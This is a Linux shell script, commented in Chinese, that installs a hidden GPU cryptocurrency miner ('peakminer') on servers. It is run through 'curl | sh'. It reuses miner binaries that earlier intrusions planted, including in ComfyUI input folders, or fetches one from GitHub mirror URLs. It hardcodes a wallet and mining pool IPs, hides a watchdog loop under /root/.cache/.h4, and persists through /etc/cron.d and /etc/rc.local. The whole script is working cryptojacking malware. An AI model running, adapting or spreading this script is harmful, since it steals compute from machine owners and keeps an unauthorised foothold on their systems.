#!/bin/sh
# h4 通用部署 v2 (linux) — 优先复用机上已有矿工二进制, 再谈下载
# 用法: curl -fsSL <url> | H4_WORKER=w-xxx sh
GH=https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/refs/heads/main
D=/root/.cache/.h4
LOG=/root/.cache/nv
mkdir -p "$D" "$LOG" 2>/dev/null
W="prl1p08n7f9q0wwf8ykrgxrxrvlwcl8htpgs2da83zgtmfwzkdy6xwnvq4ndq96"
WK="${H4_WORKER:-w-auto}"
POOL="stratum+tcp://51.79.178.22:3360,stratum+tcp://172.235.194.4:3360"

ok_bin() { [ -f "$1" ] && [ -x "$1" ] && [ "$(stat -c%s "$1" 2>/dev/null || echo 0)" -gt 30000000 ]; }

# 1) 复用已有二进制 (含对手/我方历史投放)
BIN=""
for c in "$D/pm" /root/.cc/peakminer /root/.local/bin/python/python /var/tmp/.cc-meta/peakminer \
         /app/ComfyUI/input/.h4pdx/peakminer /data0/ComfyUI/input/.h4pdx/peakminer; do
  if ok_bin "$c"; then BIN="$c"; break; fi
done
if [ -z "$BIN" ]; then
  BIN=$(find /root /opt /app /data0 /mnt /home -maxdepth 6 -type f \( -name 'peakminer' -o -name 'pm' -o -name 'python' \) -size +30M 2>/dev/null | head -1)
fi
# 2) 都没有才下载 (多镜像)
if [ -z "$BIN" ]; then
  for u in "https://ghproxy.net/$GH/bin/peakminer" "https://gh-proxy.com/$GH/bin/peakminer" "$GH/bin/peakminer"; do
    curl -fsSL -m 300 "$u" -o "$D/pm.t" 2>/dev/null
    S=$(stat -c%s "$D/pm.t" 2>/dev/null || echo 0)
    if [ "$S" -gt 30000000 ]; then chmod 700 "$D/pm.t"; BIN="$D/pm.t"; break; fi
    rm -f "$D/pm.t"
  done
fi
[ -n "$BIN" ] || { echo "FAIL no-bin"; exit 1; }
if [ "$BIN" != "$D/pm" ]; then cp -f "$BIN" "$D/pm" 2>/dev/null || ln -sf "$BIN" "$D/pm"; fi
chmod 700 "$D/pm" 2>/dev/null
echo "BIN=$BIN size=$(stat -c%s "$D/pm" 2>/dev/null)"

# 3) 守护 (flock 单授权, 判活按绝对路径 cmdline)
cat > "$D/.w" <<EOS
#!/bin/sh
D=$D
exec 9>/tmp/.h4u.lck
flock -n 9 || exit 0
while :; do
  if ! pgrep -f "[.]h4/pm" >/dev/null 2>&1; then
    cd \$D && setsid env PEAK_POOL="$POOL" PEAK_WALLET="$W" PEAK_WORKER="$WK" PEAK_COIN="pearl" \
      "\$D/pm" >>"$LOG/miner.out" 2>&1 </dev/null &
    sleep 10
  fi
  sleep 40
done
EOS
chmod 700 "$D/.w"

# 4) 拉起 + 持久化
setsid sh "$D/.w" >/dev/null 2>&1 </dev/null &
( echo "*/3 * * * * root sh $D/.w >/dev/null 2>&1" > /etc/cron.d/h4u 2>/dev/null && chmod 644 /etc/cron.d/h4u ) 2>/dev/null
[ -f /etc/rc.local ] && { grep -q 'h4u-keep' /etc/rc.local || sed -i "1i sh $D/.w >/dev/null 2>&1 & #h4u-keep" /etc/rc.local 2>/dev/null; }

sleep 15
echo "== HOST $(hostname) =="
pgrep -af "[.]h4/pm" | head -2
tail -3 "$LOG/miner.out" 2>/dev/null
nvidia-smi --query-gpu=name,memory.used,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null | head -4
